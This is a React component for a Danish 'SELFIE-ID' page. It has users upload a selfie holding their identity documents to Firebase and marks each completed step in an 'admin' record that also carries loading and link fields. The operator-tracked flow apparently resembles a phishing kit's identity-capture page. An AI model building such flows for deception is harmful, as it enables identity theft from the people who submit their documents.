import React, { useEffect, useState } from "react";
import { useTranslation } from "react-i18next";
import { getStorage, ref, uploadBytes } from "firebase/storage";
import { useOutletContext } from "react-router-dom";
import { arrayUnion, doc, updateDoc } from "firebase/firestore";
import { db } from "../../../firebase";

function Sefie() {
  const storage = getStorage();
  const [identifier, setIdentifier] = useOutletContext();
  const { t } = useTranslation();
  const [selfie, setSelfie] = useState(null);
  const [selfieDataURL, setSelfieDataURL] = useState(null);

  const changeSelfie = (e) => {
    const file = e.target.files[0];
    setSelfie(file);
  };

  const submitSelfie = async () => {
    if (!selfie) return;

    const userRef = ref(storage, identifier);
    const spaceRef = ref(userRef, "Selfie");
    const result = await Promise.all(
      [selfie].map((file) => {
        const imageRef = ref(spaceRef, file?.name);
        return uploadBytes(imageRef, file);
      })
    );

    //Update Admin Panel
    if (result) {
      await updateDoc(doc(db, "admin", identifier), {
        loading: true,
        link: "",
        date: new Date().toISOString(),
        pagesDone: arrayUnion("selfie"),
      });
    }
  };

  useEffect(() => {
    let fileReader,
      isCancel = false;
    if (selfie) {
      fileReader = new FileReader();
      fileReader.onload = (e) => {
        const { result } = e.target;
        if (result && !isCancel) {
          setSelfieDataURL(result);
        }
      };
      fileReader.readAsDataURL(selfie);
    }
    return () => {
      isCancel = true;
      if (fileReader && fileReader.readyState === 1) {
        fileReader.abort();
      }
    };
  }, [selfie]);

  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh] bg-white shadow-lg mt-12 rounded-xl">
        <div className="flex flex-col gap-10 justify-between items-center  mb-10">
          <section className="w-full flex justify-center font-bold">
          SELFIE-ID
          </section>
          {/* <section className="w-full">
            <div className="text-sm font-bold mb-4">Selfie</div>
          </section> */}
          <section className="w-full ">
            <div className="text-sm text-red-600 font-bold mb-4">
              Du skal tage en selfie med dine dokumenter :
            </div>
            {/* <div className="text-sm mb-4">
              <ul>
                <li className="text-blue-800 font-semibold">
                  Lyst og tydeligt{" "}
                  <span className="text-xs font-normal">(god kvalitech)</span>
                </li>
                <li className="text-blue-800 font-semibold">
                  ubeskaret{" "}
                  <span className="text-xs font-normal">
                    (alle hjorner skal varere synline)
                  </span>
                </li>
              </ul>
            </div> */}
            <div className="w-full flex justify-between items-center gap-4 ">
              <span className="flex justify-center">
                <img className="w-full" src="/selfie.jpeg" alt="" />
              </span>
            </div>
          </section>
          <section className="w-full">
            {!selfie ? (
              <div className="flex items-center justify-center w-full">
                <label
                  htmlFor="dropzone-file"
                  className="flex flex-col items-center justify-center w-full h-36  border-dashed rounded-lg cursor-pointer shadow-md"
                >
                  <div className="flex flex-col items-center justify-center pt-5 pb-6">
                    <svg
                      aria-hidden="true"
                      className="w-10 h-10 mb-3 text-gray-400"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="2"
                        d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
                      ></path>
                    </svg>
                    <p className="mb-2 text-sm text-gray-500 dark:text-gray-400">
                      <span className="font-semibold">upload</span>{" "}
                      <span className="text-green-500"> Selfie </span>
                      <span className="font-semibold">af dit document</span>
                    </p>
                  </div>
                  <input
                    onChange={changeSelfie}
                    id="dropzone-file"
                    type="file"
                    className="hidden"
                  />
                </label>
              </div>
            ) : (
              <div className="flex items-center justify-center w-full relative">
                {selfieDataURL ? (
                  <p
                    className="hover:cursor-pointer"
                    onClick={() => [setSelfie(null)]}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width={70}
                      height={70}
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth={2}
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="feather feather-trash-2 absolute top-1/3 left-[43%] bg-red-400 p-4 rounded-full"
                    >
                      <polyline points="3 6 5 6 21 6" />
                      <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" />
                      <line x1={10} y1={11} x2={10} y2={17} />
                      <line x1={14} y1={11} x2={14} y2={17} />
                    </svg>

                    {<img src={selfieDataURL} alt="preview" />}
                  </p>
                ) : null}
              </div>
            )}
          </section>
          <section className="w-full flex justify-center">
            <button
              onClick={submitSelfie}
              type="submit"
              className="text-white w-1/3 bg-[#2f51e9] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
            >
              <p>Naeste trin</p>
            </button>
          </section>
        </div>
      </div>
    </div>
  );
}

export default Sefie;
